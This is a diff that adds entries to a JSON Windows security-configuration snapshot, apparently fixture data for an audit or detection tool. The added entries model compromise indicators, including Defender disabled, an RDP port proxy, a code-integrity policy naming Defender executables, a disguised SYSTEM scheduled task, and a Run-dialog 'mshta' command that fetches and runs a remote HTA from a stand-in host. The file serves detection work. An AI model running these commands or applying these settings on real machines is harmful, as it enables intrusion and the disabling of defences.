@@ -95,7 +95,7 @@
   "defender": {
     "present": true,
     "amRunningMode": "Normal",
-    "amServiceEnabled": true,
+    "amServiceEnabled": false,
     "antivirusEnabled": true,
     "realTimeProtectionEnabled": false,
     "behaviorMonitorEnabled": false,
@@ -254,6 +254,20 @@
         "address": "0.0.0.0",
         "port": 161,
         "process": "snmp"
+      }
+    ],
+    "portProxy": [
+      {
+        "family": "v4tov4",
+        "protocol": "tcp",
+        "listen": "0.0.0.0/13389",
+        "connect": "10.20.0.15/3389"
+      },
+      {
+        "family": "v4tov4",
+        "protocol": "tcp",
+        "listen": "192.168.1.40/8080",
+        "connect": "127.0.0.1/8081"
       }
     ]
   },
@@ -987,6 +1001,39 @@
     ],
     "kerberosEncryptionTypes": null,
     "wefSubscriptionManager": false,
+    "windowsUpdateSource": {
+      "useWuServer": 1,
+      "server": "http://wsus.corp.example:8530",
+      "serverScheme": "http",
+      "statusServer": "http://wsus.corp.example:8530",
+      "proxyBehavior": 1,
+      "trustedPublisher": 1
+    },
+    "browserSecurity": [
+      {
+        "browser": "Chrome",
+        "appBoundEncryption": 0,
+        "remoteDebuggingAllowed": null
+      },
+      {
+        "browser": "Edge",
+        "appBoundEncryption": null,
+        "remoteDebuggingAllowed": 1
+      }
+    ],
+    "ciPolicies": [
+      {
+        "file": "{B7E4A9C2-0D31-4E57-9A6E-2C1F8B4D7E33}.cip",
+        "length": 12288,
+        "modifiedUtc": "2026-09-28T23:41:00Z",
+        "fileNames": [
+          "msmpeng.exe",
+          "mpcmdrun.exe",
+          "senseir.exe",
+          "contoso-erp.exe"
+        ]
+      }
+    ],
     "exploitProtection": {
       "dep": 2,
       "bottomUpAslr": 0,
@@ -4231,6 +4278,24 @@
       ]
     },
     {
+      "path": "\\Microsoft\\Windows\\UpdateOrchestrator\\",
+      "name": "ReportingHealth",
+      "state": "Ready",
+      "userId": "SYSTEM",
+      "groupId": "",
+      "logonType": "ServiceAccount",
+      "runLevel": "Highest",
+      "author": "CORP\\jsmith",
+      "actions": [
+        {
+          "execute": "C:\\ProgramData\\Contoso\\upd.exe",
+          "arguments": "-q",
+          "executable": "C:\\ProgramData\\Contoso\\upd.exe",
+          "writableBy": []
+        }
+      ]
+    },
+    {
       "path": "\\Contoso\\",
       "name": "NightlySync",
       "state": "Ready",
@@ -4872,6 +4937,46 @@
       }
     ],
     "userHivesRead": 1,
+    "runDialog": [
+      {
+        "user": "jsmith",
+        "source": "Run dialog",
+        "entry": "a",
+        "command": "mshta https://cdn.verify-human.example/check.hta"
+      },
+      {
+        "user": "jsmith",
+        "source": "Explorer address bar",
+        "entry": "url1",
+        "command": "net use Z: \\\\files.example@SSL\\DavWWWRoot\\share"
+      },
+      {
+        "user": "jsmith",
+        "source": "Run dialog",
+        "entry": "b",
+        "command": "ncpa.cpl"
+      }
+    ],
+    "officeTrustedLocations": [
+      {
+        "user": "jsmith",
+        "app": "Word",
+        "version": "16.0",
+        "location": "Location5",
+        "path": "\\\\files.example\\templates",
+        "allowSubfolders": true,
+        "policy": false
+      },
+      {
+        "user": "jsmith",
+        "app": "Excel",
+        "version": "16.0",
+        "location": "Location6",
+        "path": "C:\\Users\\jsmith\\Downloads",
+        "allowSubfolders": false,
+        "policy": false
+      }
+    ],
     "ssh": {
       "installed": true,
       "adminKeys": {
